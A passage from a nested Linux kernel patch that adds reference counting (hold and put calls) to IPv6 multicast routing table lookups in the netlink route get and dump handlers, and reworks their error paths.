+ 	err = ip6mr_fill_mroute(mrt, skb, NETLINK_CB(in_skb).portid,
+ 				nlh->nlmsg_seq, cache, RTM_NEWROUTE, 0);
+-	if (err < 0)
+-		goto err;
+-
+ 	rcu_read_unlock();
++	if (err < 0)
++		goto err_put;
+ 
+-	return rtnl_unicast(skb, net, NETLINK_CB(in_skb).portid);
++	err = rtnl_unicast(skb, net, NETLINK_CB(in_skb).portid);
++	ip6mr_put_table(mrt);
++	return err;
+ 
+-err:
+-	rcu_read_unlock();
++err_put:
++	ip6mr_put_table(mrt);
++err_free:
+ 	kfree_skb(skb);
+ 	return err;
+ }
+@@ -2804,7 +2969,7 @@ static int ip6mr_rtm_dumproute(struct sk_buff *skb, struct netlink_callback *cb)
+ 	if (filter.table_id) {
+ 		struct mr_table *mrt;
+ 
+-		mrt = __ip6mr_get_table(sock_net(skb->sk), filter.table_id);
++		mrt = ip6mr_get_table_hold(sock_net(skb->sk), filter.table_id);
+ 		if (!mrt) {
+ 			if (rtnl_msg_family(cb->nlh) != RTNL_FAMILY_IP6MR) {
+ 				err = skb->len;
+@@ -2818,6 +2983,7 @@ static int ip6mr_rtm_dumproute(struct sk_buff *skb, struct netlink_callback *cb)
+ 
+ 		err = mr_table_dump(mrt, skb, cb, _ip6mr_fill_mroute,
+ 				    &mfc_unres_lock, &filter);
++		ip6mr_put_table(mrt);
+ 		err = skb->len ? : err;
+ 		goto unlock;
+ 	}
+-- 
+2.43.0
